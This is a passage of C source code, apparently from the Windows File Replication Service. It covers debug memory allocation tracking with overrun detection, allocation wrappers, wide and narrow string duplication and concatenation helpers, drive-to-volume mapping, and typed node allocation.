            // DUP ALLOCATION (OVERLAP DETECTED)
            //      Release lock in case DPRINT calls allocation routines
            //
            LeaveCriticalSection(&MemLock);
            DPRINT4(0, "ERROR -- DUP ALLOC: 0x%x to 0x%x is already allocated to 0x%x to 0x%x; EXITING\n",
                Begin, End, Mem->Begin, Mem->End);
            FRS_ASSERT(!"Duplicate memory allocation");
        }
        //
        // This memory should be linked later in the sorted memory list
        //
        if (Begin > Mem->Begin) {
            PMem = &Mem->Next;
            continue;
        }
        //
        // This memory should be linked here in the sorted memory list
        //
        break;
    }
    //
    // Allocate a memory block header
    //
    Mem = FreeMemList;
    if (Mem) {
        --MemOnFreeList;
        FreeMemList = Mem->Next;
    } else {
        Mem = (PVOID)malloc(sizeof(MEM));
        if (Mem == NULL) {
            RaiseException(ERROR_OUTOFMEMORY, 0, 0, NULL);
        }
        ZeroMemory(Mem, sizeof(MEM));
    }

    //
    // Initialize the header and the header/trailer for memory overrun detection.
    //
    Mem->OrigSize = OrigSize;
    Mem->End = End;
    Mem->Begin = Begin;

    //
    // Initialize the header/trailer for memory overrun detection.
    //
    *Mem->Begin = (ULONG_PTR)Begin;
    *(Mem->Begin + 1) = OrigSize;
    Pattern = (ULONG_PTR)(Mem->End) | (Mem->OrigSize << 24);
    CopyMemory(((PCHAR)Begin) + Mem->OrigSize + 8, (PCHAR)&Pattern, sizeof(Pattern));

    //
    // Add to sorted list
    //
    Mem->Next = *PMem;
    *PMem = Mem;
    //
    // Note: stackwalk won't work from here; see frsalloctype()
    //
    // DbgStackTrace(Mem->Stack, DBG_NUM_MEM_STACK)

    //
    // Memory stats
    //
    Calls = ++TotalAllocCalls;
    TotalAlloced += (DWORD)((PUCHAR)End - (PUCHAR)Begin);
    TotalDelta = TotalAlloced - TotalFreed;
    if (TotalDelta > TotalDeltaMax) {
        TotalDeltaMax = TotalDelta;
    }
    if (Begin > MaxAllocAddr) {
        ++NewAllocs;
        MaxAllocAddr = Begin;
    } else {
        if (!MinAllocAddr) {
            MinAllocAddr = Begin;
        }
        ++ReAllocs;
    }

    //
    // Tracking memory sizes
    //
    MemIndex = OrigSize >> 4;
    if (MemIndex >= MAX_MEM_INDEX) {
        MemIndex = (MAX_MEM_INDEX - 1);
    }
    SizesAllocated[MemIndex]++;
    SizesAllocatedCount[MemIndex]++;
    if (SizesAllocated[MemIndex] > SizesAllocatedMax[MemIndex]) {
        SizesAllocatedMax[MemIndex] = SizesAllocated[MemIndex];
    }

    //
    // Done
    //
    LeaveCriticalSection(&MemLock);

    //
    // Print memory stats every so often
    //
    if (!(Calls % TotalTrigger)) {
        DbgPrintThreadIds(DebugInfo.LogSeverity);
        FrsPrintAllocStats(DebugInfo.LogSeverity, NULL, 0);
    }
    DbgCheckAll();
    return Mem;
}


VOID
DbgFree(
    IN PULONG_PTR Begin
    )
/*++
Routine Description:
    Remove allocated memory from list

Arguments:
    Begin - allocated (maybe) memory

Return Value:
    TRUE    - found it
    FALSE   - didn't find it
--*/
{
#undef DEBSUB
#define DEBSUB "DbgFree:"
    PMEM    *PMem;
    PMEM    Mem;
    DWORD   MemIndex;

    //
    // Freeing NULL pointer is allowed
    //
    if (Begin == NULL || !DebugInfo.Mem) {
        return;
    }

    DbgCheckAll();
    EnterCriticalSection(&MemLock);
    PMem = &MemList;
    for (Mem = *PMem; Mem; Mem = *PMem) {
        //
        // Check for overwritten memory
        //
        DbgCheck(Mem);

        //
        // Not the right one
        //
        if (Begin > Mem->Begin) {
            PMem = &Mem->Next;
            continue;
        }
        if (Begin != Mem->Begin) {
            break;
        }
        //
        // Found it; remove from list and free it
        //
        ++TotalFreeCalls;
        TotalFreed += (DWORD)((PUCHAR)Mem->End - (PUCHAR)Mem->Begin);
        TotalDelta = TotalAlloced - TotalFreed;

        MemIndex = Mem->OrigSize >> 4;
        if (MemIndex >= MAX_MEM_INDEX) {
            MemIndex = (MAX_MEM_INDEX - 1);
        }
        SizesAllocated[MemIndex]--;

        *PMem = Mem->Next;
        if (MemOnFreeList > MAX_MEM_ON_FREE_LIST) {
            free(Mem);
        } else {
            ++MemOnFreeList;
            Mem->Next = FreeMemList;
            FreeMemList = Mem;
        }
        LeaveCriticalSection(&MemLock);
        DbgCheckAll();
        return;
    }
    LeaveCriticalSection(&MemLock);
    DPRINT1(0, "ERROR -- Memory @ 0x%x is not allocated\n", Begin);
    FRS_ASSERT(!"Memory free error, not allocated");
}


BOOL
DbgIsAlloc(
    IN PULONG_PTR Begin
    )
/*++
Routine Description:
    Is Begin alloced?

Arguments:
    Begin - allocated (maybe) memory

Return Value:
    TRUE    - found it
    FALSE   - didn't find it
--*/
{
#undef DEBSUB
#define DEBSUB "DbgIsAlloc:"
    PMEM    *PMem;
    PMEM    Mem;

    if (!DebugInfo.Mem) {
        return TRUE;
    }

    //
    // NULL pointer is always alloced
    //
    if (Begin == NULL) {
        return TRUE;
    }

    DbgCheckAll();
    EnterCriticalSection(&MemLock);
    PMem = &MemList;
    for (Mem = *PMem; Mem; Mem = *PMem) {
        //
        // Check for overwritten memory
        //
        DbgCheck(Mem);

        //
        // Not the right one
        //
        if (Begin > Mem->Begin) {
            PMem = &Mem->Next;
            continue;
        }

        if (Begin != Mem->Begin) {
            break;
        }
        LeaveCriticalSection(&MemLock);
        DbgCheckAll();
        return TRUE;
    }
    LeaveCriticalSection(&MemLock);
    DbgCheckAll();
    return FALSE;
}



PVOID
FrsAlloc(
    IN DWORD OrigSize
    )
/*++
Routine Description:
        Allocate memory. Raise an exception if there is no memory.

Arguments:
        Size    - size of the memory request

Return Value:
        Allocated memory.
--*/
{
#undef DEBSUB
#define DEBSUB "FrsAlloc:"
    PVOID   Node;
    DWORD   Size;
    PMEM    Mem;

    //
    // FRS_ASSERT is added here to satisfy prefix. The return value from FrsAlloc is not checked anywhere
    // in the code.
    //

    FRS_ASSERT(OrigSize != 0);

    Size = OrigSize;

    if (DebugInfo.Mem) {
        //
        // Check for debug break
        //
        if (OrigSize == DbgBreakSize) {
            if (DbgBreakTrigger) {
                if (--DbgBreakTrigger <= 0) {
                    DbgBreakTrigger = DbgBreakReset;
                    DbgBreakReset += DbgBreakResetInc;
                    MyDbgBreak();
                }
            }
        }
        //
        // Adjust size for header/trailer
        //
        Size = (((OrigSize + 7) >> 3) << 3) + 16;
    }

    //
    // Raise an exception if there is no memory
    //
    Node = (PVOID)malloc(Size);
    if (Node == NULL) {
        RaiseException(ERROR_OUTOFMEMORY, 0, 0, NULL);
    }
    ZeroMemory(Node, Size);

    //
    // Even with mem alloc tracing off call DbgAlloc to capture mem alloc stats.
    //
    Mem = DbgAlloc(Node, (PULONG_PTR)(((PCHAR)Node) + Size), OrigSize);

    //
    // Note: should be in dbgalloc(); but stackwalk won't work
    //
    if (DebugInfo.Mem) {
        DbgStackTrace(Mem->Stack, DBG_NUM_MEM_STACK);
        ((PCHAR)Node) += 8;
    }

    return Node;
}


PVOID
FrsRealloc(
    PVOID OldNode,
    DWORD OrigSize
    )
/*++
Routine Description:
    Reallocate memory. Raise an exception if there is no memory.

Arguments:
    Size    - size of the memory request

Return Value:
    Reallocated memory.
--*/
{
#undef DEBSUB
#define DEBSUB "FrsRealloc:"
    PVOID   Node;
    DWORD   Size;
    PMEM    Mem;

    if (!OldNode) {

        //
        // Need to check if OrigSize == 0 as FrsAlloc asserts if called with 0 as the first parameter (prefix fix).
        //

        if (OrigSize == 0) {
            return NULL;
        }

        return FrsAlloc(OrigSize);
    }

    Size = OrigSize;

    if (DebugInfo.Mem) {
        ((PCHAR)OldNode) -= 8;
        DbgFree(OldNode);
        //
        // Adjust size for header/trailer
        //
        Size = (((OrigSize + 7) >> 3) << 3) + 16;
    }
    //
    // Raise an exception if there is no memory
    //
    Node = (PVOID)realloc(OldNode, Size);
    if (Node == NULL) {
        RaiseException(ERROR_OUTOFMEMORY, 0, 0, NULL);
    }

    //
    // Even with mem alloc tracing off call DbgAlloc to capture mem alloc stats.
    //
    Mem = DbgAlloc(Node, (PULONG_PTR)(((PCHAR)Node) + Size), OrigSize);

    //
    // Note: should be in dbgalloc(); but stackwalk won't work
    //
    if (DebugInfo.Mem) {
        DbgStackTrace(Mem->Stack, DBG_NUM_MEM_STACK);
        ((PCHAR)Node) += 8;
    }

    return Node;
}


PVOID
FrsFree(
    PVOID   Node
    )
/*++
Routine Description:
    Free memory allocated with FrsAlloc

Arguments:
    Node    - memory allocated with FrsAlloc

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB "FrsFree:"

    if (!Node) {
        return NULL;
    }

    if (DebugInfo.Mem) {
        ((PCHAR)Node) -= 8;
        DbgFree(Node);
    }

    free(Node);

    if (DebugInfo.MemCompact) {
        HeapCompact(GetProcessHeap(), 0);
    }

    return NULL;
}


PCHAR
FrsWtoA(
    PWCHAR Wstr
    )
/*++
Routine Description:
    Translate a wide char string into a newly allocated char string.

Arguments:
    Wstr - wide char string

Return Value:
    Duplicated string. Free with FrsFree().
--*/
{
#undef DEBSUB
#define DEBSUB "FrsWtoA:"
    PCHAR   Astr;

    //
    // E.g., when duplicating NodePartner when none exists
    //
    if (Wstr == NULL)
        return NULL;

    Astr = FrsAlloc(wcslen(Wstr) + 1);
    sprintf(Astr, "%ws", Wstr);

    return Astr;
}




PWCHAR
FrsWcsTrim(
    PWCHAR Wstr,
    WCHAR  Trim
    )
/*++
Routine Description:

    Remove the Trim char from the trailing end of the string by replacing
    any occurance with a L'\0'.
    Skip over any leading Trim chars and return a ptr to the first non-TRIM
    char found.  If we hit the end of the string return the pointer to
    the terminating null.

Arguments:

    Wstr - wide char string
    Trim - Char to trim.

Return Value:

    ptr to first non Trim char.
--*/
{

#undef DEBSUB
#define DEBSUB "FrsWcsTrim:"

    LONG Len, Index;

    if (Wstr == NULL)
        return NULL;

    //
    //
    Len = wcslen(Wstr);
    Index = Len - 1;

    while (Index >= 0) {
        if (Wstr[Index] != Trim) {
            break;
        }
        Index--;
    }

    Wstr[++Index] = UNICODE_NULL;

    Len = Index;
    Index = 0;
    while (Index < Len) {
        if (Wstr[Index] != Trim) {
            break;
        }
        Index++;
    }

    return Wstr + Index;

}



PWCHAR
FrsAtoW(
    PCHAR Astr
    )
/*++
Routine Description:
    Translate a wide char string into a newly allocated char string.

Arguments:
    Wstr - wide char string

Return Value:
    Duplicated string. Free with FrsFree().
--*/
{
    PWCHAR   Wstr;

    //
    // E.g., when duplicating NodePartner when none exists
    //
    if (Astr == NULL) {
        return NULL;
    }

    Wstr = FrsAlloc((strlen(Astr) + 1) * sizeof(WCHAR));
    swprintf(Wstr, L"%hs", Astr);

    return Wstr;
}


PWCHAR
FrsWcsDup(
    PWCHAR OldStr
    )
/*++
Routine Description:
    Duplicate a string using our memory allocater

Arguments:
    OldArg  - string to duplicate

Return Value:
    Duplicated string. Free with FrsFree().
--*/
{
#undef DEBSUB
#define DEBSUB "FrsWcsDup:"

    PWCHAR  NewStr;

    //
    // E.g., when duplicating NodePartner when none exists
    //
    if (OldStr == NULL) {
        return NULL;
    }

    NewStr = FrsAlloc((wcslen(OldStr) + 1) * sizeof(WCHAR));
    wcscpy(NewStr, OldStr);

    return NewStr;
}


VOID
FrsBuildVolSerialNumberToDriveTable(
    PWCHAR  pLogicalDrives,
    BOOL    EmptyTable
    )
/*++
Routine Description:
    New way to get the current configuration from the DS and merge it with
    the active replicas.

Arguments:
    None.

Return Value:
    None.
--*/
{
#undef DEBSUB
#define  DEBSUB  "FrsBuildVolSerialNumberToDriveTable:"

    ULONG                           MaxFileNameLen;
    DWORD                           FileSystemFlags;
    PWCHAR                          DrivePtr = NULL;
    DWORD                           WStatus;
    PVOLUME_INFO_NODE               VolumeInfoNode;
    UINT                            DriveType;
    ULONG                           VolumeSerialNumber = 0;
    WCHAR                           LogicalDrives[MAX_PATH];
    WCHAR                           VolumeGuidName[MAX_PATH];

    //
    // Initialize the VolSerialNumberToDriveTable.
    //
    if (VolSerialNumberToDriveTable == NULL) {
        VolSerialNumberToDriveTable = GTabAllocNumberTable();
    }

    //
    // Get the logical drive strings.
    //
    if (pLogicalDrives == NULL) {

        if (!GetLogicalDriveStrings(MAX_PATH, LogicalDrives) || (VolSerialNumberToDriveTable == NULL)) {
            DPRINT_WS(1, "WARN - Getting logical drives. It may not be possible to start on this server.", GetLastError());
            return;
        }
        DrivePtr = LogicalDrives;
    } else {
        //
        // Parameter passed in.
        //
        DrivePtr = pLogicalDrives;
    }


    //
    // Lock the table during rebuild to synchronize with the many callers of
    // FrsWcsVolume() in other threads.
    //
    GTabLockTable(VolSerialNumberToDriveTable);

    if (EmptyTable) {
        GTabEmptyTableNoLock(VolSerialNumberToDriveTable, FrsFree);
    }

    while (wcscmp(DrivePtr,L"")) {

        DriveType = GetDriveType(DrivePtr);
        //
        // Skip remote drives and CDROM drives.
        //
        if ((DriveType == DRIVE_REMOTE) || (DriveType == DRIVE_CDROM)) {
            DPRINT1(4, "Skipping Drive %ws. Invalid drive type.\n", DrivePtr);
            DrivePtr = DrivePtr + wcslen(DrivePtr) + 1;
            continue;
        }

        if (!GetVolumeInformation(DrivePtr,
                                  VolumeGuidName,
                                  MAX_PATH,
                                  &VolumeSerialNumber,
                                  &MaxFileNameLen,
                                  &FileSystemFlags,
                                  NULL,
                                  0)){

            WStatus = GetLastError();
            if (!WIN_SUCCESS(WStatus)) {
                //
                // Reducing noise at severity 1 in debug logs.
                // GetVolumeInformation always fails on the A drive.
                //
                if (!_wcsicmp(DrivePtr, L"A:\\")) {
                    DPRINT2(5,"WARN - GetvolumeInformation for %ws; %s\n", DrivePtr, ErrLabelW32(WStatus));
                } else {
                    DPRINT2(1,"WARN - GetvolumeInformation for %ws; %s\n", DrivePtr, ErrLabelW32(WStatus));
                }
            }
           DrivePtr = DrivePtr + wcslen(DrivePtr) + 1;
           continue;
       }

       VolumeInfoNode = FrsAlloc(sizeof(VOLUME_INFO_NODE));
       wcscpy(VolumeInfoNode->DriveName, L"\\\\.\\");
       wcscat(VolumeInfoNode->DriveName, DrivePtr);

       //
       // Remove the trailing back slash.
       //
       VolumeInfoNode->DriveName[wcslen(VolumeInfoNode->DriveName) - 1] = L'\0';

       VolumeInfoNode->VolumeSerialNumber = VolumeSerialNumber;

       GTabInsertEntryNoLock(VolSerialNumberToDriveTable, VolumeInfoNode, &(VolumeInfoNode->VolumeSerialNumber), NULL);

       DrivePtr = DrivePtr + wcslen(DrivePtr) + 1;
    }

    GTabUnLockTable(VolSerialNumberToDriveTable);

    return;
}


PWCHAR
FrsWcsVolume(
    PWCHAR Path
    )
/*++
Routine Description:
    Get the drive from the VolSerialNumberToDriveTable.  The volume serial
    number is used to locate the drive since a mount point can take us to
    another drive.

Arguments:
    Path

Return Value:
    Duplicated string containing drive:\ from Path or NULL.
--*/
{
#undef DEBSUB
#define DEBSUB "FrsWcsVolume:"
    PWCHAR                       Volume = NULL;
    HANDLE                       DirHandle;
    DWORD                        WStatus;
    NTSTATUS                     Status;
    IO_STATUS_BLOCK              IoStatusBlock;
    DWORD                        VolumeInfoLength;
    PFILE_FS_VOLUME_INFORMATION  VolumeInfo;
    PVOLUME_INFO_NODE            VolumeInfoNode = NULL;
    ULONG                        Colon = 0;
    WCHAR                        LogicalDrive[5]; // "D:\<null><null>"


    //
    // Get the volume Guid for the path.
    //
    // Always open the path by masking off the FILE_OPEN_REPARSE_POINT flag
    // because we want to open the destination dir not the junction if the root
    // happens to be a mount point.
    //
    WStatus = FrsOpenSourceFileW(&DirHandle,
                                 Path,
                                 GENERIC_READ,
                                 FILE_OPEN_FOR_BACKUP_INTENT);
    CLEANUP1_WS(4,"ERROR - Could not open %ws;", Path, WStatus, RETURN);

    VolumeInfoLength = sizeof(FILE_FS_VOLUME_INFORMATION) +
                       MAXIMUM_VOLUME_LABEL_LENGTH;

    VolumeInfo = FrsAlloc(VolumeInfoLength);

    Status = NtQueryVolumeInformationFile(DirHandle,
                                          &IoStatusBlock,
                                          VolumeInfo,
                                          VolumeInfoLength,
                                          FileFsVolumeInformation);
    NtClose(DirHandle);

    if (NT_SUCCESS(Status)) {
        //
        // Look for the volume if the mapping table exists.
        //
        if (VolSerialNumberToDriveTable != NULL) {
            VolumeInfoNode = GTabLookup(VolSerialNumberToDriveTable,
                                        &(VolumeInfo->VolumeSerialNumber),
                                        NULL);
        }

        //
        // If the volume is not found in the table or if the table is not yet
        // initialized then initialize the table and add the drive taken from
        // this path to the list of drives in the table. In most cases the
        // drive extracted from the path will be same as the volume that hosts the
        // path.
        //
        if (VolumeInfoNode == NULL) {
            //
            // Create the table and add the prefix drive to the table of drives.
            // Find the position of colon in the path to extract the drive letter.
            // The path may be of the form "d:\replicaroot" or "\\?\d:\replicaroot"
            //
            Colon = wcscspn(Path, L":");

            if (Path[Colon] == L':') {
                CopyMemory(LogicalDrive, &Path[Colon - 1], 3 * sizeof(WCHAR)); // "D:\"
                LogicalDrive[3] = L'\0';
                LogicalDrive[4] = L'\0';
            } // else LogicalDrive remains NULL

            //
            // Add the drive and do not empty the table.
            //
            FrsBuildVolSerialNumberToDriveTable(LogicalDrive, FALSE);

            VolumeInfoNode = GTabLookup(VolSerialNumberToDriveTable, &(VolumeInfo->VolumeSerialNumber), NULL);
        }

        //
        // If the volume is still not found in the mapping table then it means that
        // the prefix of the path (E.g. "D:\" if the path is "D:\replicaroot" ) is not the
        // volume that hosts the path. In this case load the mapping table with all
        // the drives on the computer and look for the volume again.
        //
        if (VolumeInfoNode == NULL) {

            //
            // Could not find the drive in the table. Rebuild the table by enumerating
            // all the drives on the computer and try again.
            //

            DPRINT1(2, "WARN - Enumerating all drives on the computer to find the volume for path %ws\n", Path);

            //
            // Enumerate and add all drives to the table. Empty the table before starting.
            //
            FrsBuildVolSerialNumberToDriveTable(NULL, TRUE);

            VolumeInfoNode = GTabLookup(VolSerialNumberToDriveTable, &(VolumeInfo->VolumeSerialNumber), NULL);
        }


        if (VolumeInfoNode) {
            Volume = FrsWcsDup(VolumeInfoNode->DriveName);
        } else {
            DPRINT1(0, "ERROR - Volume not found for path %ws\n", Path);
        }
    } else {
        DPRINT1_NT(1,"WARN - NtQueryVolumeInformationFile failed for %ws;", Path, Status);
    }

    VolumeInfo = FrsFree(VolumeInfo);

RETURN:
    return Volume;
}


PWCHAR
FrsWcsCat3(
    PWCHAR  First,
    PWCHAR  Second,
    PWCHAR  Third
    )
/*++
Routine Description:
    Concatenate three strings into a new string using our memory allocater

Arguments:
    First   - First string in the concat
    Second  - Second string in the concat
    Third   - Third string in the concat

Return Value:
    Return concatenated string. Free with FrsFree().
--*/
{
#undef DEBSUB
#define DEBSUB "FrsWcscat3:"

    PCHAR  New;
    DWORD   BytesFirst;
    DWORD   BytesSecond;
    DWORD   BytesThird;

    if (!First || !Second || !Third) {
        return NULL;
    }

    //
    // Allocate a buffer for the concatentated string
    //
    BytesFirst = wcslen(First) * sizeof(WCHAR);
    BytesSecond = wcslen(Second) * sizeof(WCHAR);
    BytesThird = (wcslen(Third) + 1) * sizeof(WCHAR);

    New = (PCHAR)FrsAlloc(BytesFirst + BytesSecond + BytesThird);

    CopyMemory(&New[0], First, BytesFirst);
    CopyMemory(&New[BytesFirst], Second, BytesSecond);
    CopyMemory(&New[BytesFirst + BytesSecond], Third, BytesThird);

    return (PWCHAR)New;
}


PWCHAR
FrsWcsCat(
    PWCHAR First,
    PWCHAR Second
    )
/*++
Routine Description:
    Concatenate two strings into a new string using our memory allocater

Arguments:
    First   - First string in the concat
    Second  - Second string in the concat

Return Value:
    Duplicated and concatentated string. Free with FrsFree().
--*/
{
#undef DEBSUB
#define DEBSUB "FrsWcscat:"

    DWORD   Bytes;
    PWCHAR  New;

    FRS_ASSERT(First != NULL && Second != NULL);

    // size of new string
    Bytes = (wcslen(First) + wcslen(Second) + 1) * sizeof(WCHAR);
    New = (PWCHAR)FrsAlloc(Bytes);

    // Not as efficient as I would like but this routine is seldom used
    wcscpy(New, First);
    wcscat(New, Second);

    return New;
}


PCHAR
FrsCsCat(
    PCHAR First,
    PCHAR Second
    )
/*++
Routine Description:
    Concatenate two strings into a new string using our memory allocater

Arguments:
    First   - First string in the concat
    Second  - Second string in the concat

Return Value:
    Duplicated and concatentated string. Free with FrsFree().
--*/
{
#undef DEBSUB
#define DEBSUB "FrsCscat:"

    DWORD   Bytes;
    PCHAR  New;

    FRS_ASSERT(First != NULL && Second != NULL);

    // size of new string
    Bytes = strlen(First) + strlen(Second) + 1;
    New = (PCHAR)FrsAlloc(Bytes);

    // Not as efficient as I would like but this routine is seldom used
    strcpy(New, First);
    strcat(New, Second);

    return New;
}


PWCHAR
FrsWcsPath(
    PWCHAR First,
    PWCHAR Second
    )
/*++
Routine Description:
    Concatenate two strings into a pathname

Arguments:
    First   - First string in the concat
    Second  - Second string in the concat

Return Value:
    Dup of First\Second. Free with FrsFree();
--*/
{
#undef DEBSUB
#define DEBSUB "FrsWcsPath:"
    return FrsWcsCat3(First, L"\\", Second);
}


PCHAR
FrsCsPath(
    PCHAR First,
    PCHAR Second
    )
/*++
Routine Description:
    Concatenate two strings into a pathname

Arguments:
    First   - First string in the concat
    Second  - Second string in the concat

Return Value:
    Duplicated and concatentated string. Free with FrsFree().
--*/
{
#undef DEBSUB
#define DEBSUB "FrsCsPath:"
    PCHAR  TmpPath;
    PCHAR  FinalPath;

    //
    // Very inefficient but seldom called
    //
    TmpPath = FrsCsCat(First, "\\");
    FinalPath = FrsCsCat(TmpPath, Second);
    FrsFree(TmpPath);
    return FinalPath;
}


PVOID
FrsAllocTypeSize(
    IN NODE_TYPE NodeType,
    IN ULONG SizeDelta
    )
/*++

Routine Description:

    This routine allocates memory for the given node type and performs any
    node specific initialization/allocation.  The node is zeroed and the
    size/type fields are filled in.

Arguments:

    NodeType - The type of node to allocate.

    SizeDelta - The amount of storage to allocate in ADDITION to the base type.

Return Value:

    The node address is returned here. An exception is raised if
        memory could not be allocated.

--*/
{
#undef DEBSUB
#define DEBSUB "FrsAllocTypeSize:"

    PVOID                  Node;
    ULONG                  NodeSize;
    PREPLICA               Replica;
    PREPLICA_THREAD_CTX    RtCtx;
    PTHREAD_CTX            ThreadCtx;
    PTABLE_CTX             TableCtx;
    ULONG                  i;
    PJBUFFER               Jbuffer;
    PVOLUME_MONITOR_ENTRY  pVme;
    PFILTER_TABLE_ENTRY    FilterEntry;
    PQHASH_TABLE           QhashTable;
    PCXTION                Cxtion;
    PCONFIG_NODE           ConfigNode;
    PCHANGE_ORDER_ENTRY    ChangeOrder;
    PGHANDLE               GHandle;
    PWILDCARD_FILTER_ENTRY WildcardEntry;
    PREPARSE_TAG_TABLE_ENTRY ReparseTagTableEntry;

    switch (NodeType) {

    //
    // Allocate a Thread Context struct
    //
    case THREAD_CONTEXT_TYPE:
        NodeSize = sizeof(THREAD_CTX);
        Node = FrsAlloc(NodeSize);

        //
        // No session or DB open yet.
        //
        ThreadCtx = (PTHREAD_CTX) Node;
        ThreadCtx->JSesid = JET_sesidNil;
        ThreadCtx->JDbid = JET_dbidNil;
        ThreadCtx->JInstance  = GJetInstance;

        FrsRtlInitializeList(&ThreadCtx->ThreadCtxListHead);
        break;

    //
    // Allocate a Replica struct and the config table ctx struct.
    //
    case REPLICA_TYPE:
        NodeSize = sizeof(REPLICA);
        Node = FrsAlloc(NodeSize);

        Replica = (PREPLICA) Node;

        //
        // Config record flags (CONFIG_FLAG_... in schema.h)
        //
        SetFlag(Replica->CnfFlags, CONFIG_FLAG_MULTIMASTER);

        INITIALIZE_CRITICAL_SECTION(&Replica->ReplicaLock);
        FrsRtlInitializeList(&Replica->ReplicaCtxListHead);

        InitializeListHead(&Replica->FileNameFilterHead);
        InitializeListHead(&Replica->FileNameInclFilterHead);
        InitializeListHead(&Replica->DirNameFilterHead);
        InitializeListHead(&Replica->DirNameInclFilterHead);

        Replica->ConfigTable.TableType = TABLE_TYPE_INVALID;
        DbsAllocTableCtx(ConfigTablex, &Replica->ConfigTable);

        Replica->VVector = GTabAllocTable();
        Replica->OutlogVVector = GTabAllocTable();
        Replica->Cxtions = GTabAllocTable();
        Replica->FStatus = FrsErrorSuccess;
        Replica->Consistent = TRUE;

        INITIALIZE_CRITICAL_SECTION(&Replica->OutLogLock);
        InitializeListHead(&Replica->OutLogEligible);
        InitializeListHead(&Replica->OutLogStandBy);
        InitializeListHead(&Replica->OutLogActive);
        InitializeListHead(&Replica->OutLogInActive);
        Replica->OutLogWorkState = OL_REPLICA_INITIALIZING;

        Replica->ServiceState = REPLICA_STATE_ALLOCATED;
        Replica->OutLogJLx = 1;

        //
        // No preinstall directory, yet
        //
        Replica->PreInstallHandle = INVALID_HANDLE_VALUE;

        //
        // Initialize the NewStage fiend.
        //
        Replica->NewStage = NULL;

        //
        // Initialize InitSyncCxtionsMasterList and InitSyncCxtionsWorkingList.
        //
        Replica->InitSyncCxtionsMasterList = NULL;
        Replica->InitSyncCxtionsWorkingList = NULL;
        Replica->InitSyncQueue = NULL;

        //
        // Add memory for the counter data structure, set the back pointer
        // and bump ref count.
        //
        Replica->PerfRepSetData =
              (PHT_REPLICA_SET_DATA) FrsAlloc (sizeof(HT_REPLICA_SET_DATA));
        Replica->PerfRepSetData->RepBackPtr = Replica;
        InterlockedIncrement(&Replica->ReferenceCount);

        break;

    //
    // Allocate a Replica Thread Context struct and the table context structs.
    //
    case REPLICA_THREAD_TYPE:
        NodeSize = sizeof(REPLICA_THREAD_CTX);
        Node = FrsAlloc(NodeSize);

        //
        // Get the base of the array of TableCtx structs from the replica thread
        // context struct and the base of the table create structs.
        //
        RtCtx = (PREPLICA_THREAD_CTX) Node;
        TableCtx = RtCtx->RtCtxTables;

        //
        // Open the initial set of tables for the replica set.
        //
        for (i=0; i<TABLE_TYPE_MAX; ++i, ++TableCtx) {
                //
                // Marking the TableType as INVALID causes DbsAllocTableCtx()
                // to allocate the DB support structs on the first call.
                //
                TableCtx->TableType = TABLE_TYPE_INVALID;

                //
                // If the SizeDelta parameter is non-zero then do not allocate
                // the TableCtx internal structs.  The caller will do it.
                //
                if (SizeDelta == 0) {
                    DbsAllocTableCtx(i, TableCtx);
                } else {
                    //
                    // Mark table as not open by a session yet.
                    //
                    TableCtx->Tid   = JET_tableidNil;
                    TableCtx->Sesid = JET_sesidNil;
                    TableCtx->ReplicaNumber = FRS_UNDEFINED_REPLICA_NUMBER;
                }
        }

        break;

    //
    // Allocate a topology node
    //
    case CONFIG_NODE_TYPE:
        NodeSize = sizeof(CONFIG_NODE);
        Node = FrsAlloc(NodeSize);

        ConfigNode = (PCONFIG_NODE) Node;
        ConfigNode->Consistent = TRUE;

        break;

    //
    // Allocate a connection
    //
    case CXTION_TYPE:
        NodeSize = sizeof(CXTION);
        Node = FrsAlloc(NodeSize);
        Cxtion = Node;
        Cxtion->CoeTable = GTabAllocTable();
        //
        // Allocate memory for the counter data structure
        //
        Cxtion->PerfRepConnData =
            (PHT_REPLICA_CONN_DATA) FrsAlloc (sizeof(HT_REPLICA_CONN_DATA));

        break;

    //
    // Allocate a list of bound rpc handles indexed by server guid
    //
    case GHANDLE_TYPE:
        NodeSize = sizeof(GHANDLE);
        Node = FrsAlloc(NodeSize);
        GHandle = Node;
        INITIALIZE_CRITICAL_SECTION(&GHandle->Lock);

        break;

    //
    // Allocate a generic table
    //
    case GEN_TABLE_TYPE:
        NodeSize = sizeof(GEN_TABLE);
        Node = FrsAlloc(NodeSize);

        break;

    //
    // Allocate a generic thread context
    //
    case THREAD_TYPE:
        NodeSize = sizeof(FRS_THREAD);
        Node = FrsAlloc(NodeSize);

        break;

    //
    // Allocate a journal read buffer.
    //
    case JBUFFER_TYPE:
        NodeSize = SizeOfJournalBuffer;
        Node = FrsAlloc(NodeSize);

        //
        // Init the data buffer size and start address.
        //
        Jbuffer = (PJBUFFER) Node;
        Jbuffer->BufferSize = NodeSize - SizeOfJournalBufferDesc;
        Jbuffer->DataBuffer = &Jbuffer->Buffer[0];

        break;

    //
    // Allocate a journal volume monitor entry.
    //
    case VOLUME_MONITOR_ENTRY_TYPE:

        NodeSize = sizeof(VOLUME_MONITOR_ENTRY);
        Node = FrsAlloc(NodeSize);

        pVme = (PVOLUME_MONITOR_ENTRY) Node;
        FrsRtlInitializeList(&pVme->ReplicaListHead);
        INITIALIZE_CRITICAL_SECTION(&pVme->Lock);
        INITIALIZE_CRITICAL_SECTION(&pVme->QuadWriteLock);
        pVme->Event = CreateEvent(NULL, TRUE, FALSE, NULL);
        pVme->JournalState = JRNL_STATE_ALLOCATED;
        break;

    //
    // Allocate a command packet.
    //
    case COMMAND_PACKET_TYPE:

        NodeSize = sizeof(COMMAND_PACKET);
        Node = FrsAlloc(NodeSize + SizeDelta);

        break;

    //
    // Allocate a generic hash table struct.
    //
    case GENERIC_HASH_TABLE_TYPE:

        NodeSize = sizeof(GENERIC_HASH_TABLE);
        Node = FrsAlloc(NodeSize);

        break;

    //
    // Allocate a Change Order Entry struct.  Caller allocates Extension as necc.
    //
    case CHANGE_ORDER_ENTRY_TYPE:

        NodeSize = sizeof(CHANGE_ORDER_ENTRY);
        Node = FrsAlloc(NodeSize + SizeDelta);
        ChangeOrder = (PCHANGE_ORDER_ENTRY)Node;

        //
        // Init the unicode filename string to point to internal alloc.
        //
        ChangeOrder->UFileName.Buffer = ChangeOrder->Cmd.FileName;
        ChangeOrder->UFileName.MaximumLength = (USHORT)
            (SIZEOF(CHANGE_ORDER_ENTRY, Cmd.FileName) + SizeDelta);
        ChangeOrder->UFileName.Length = 0;

        break;

    //
    // Allocate a Filter Table Entry struct.
    //
    case FILTER_TABLE_ENTRY_TYPE:

        NodeSize = sizeof(FILTER_TABLE_ENTRY);
        Node = FrsAlloc(NodeSize + SizeDelta);
        FilterEntry = (PFILTER_TABLE_ENTRY)Node;
        //
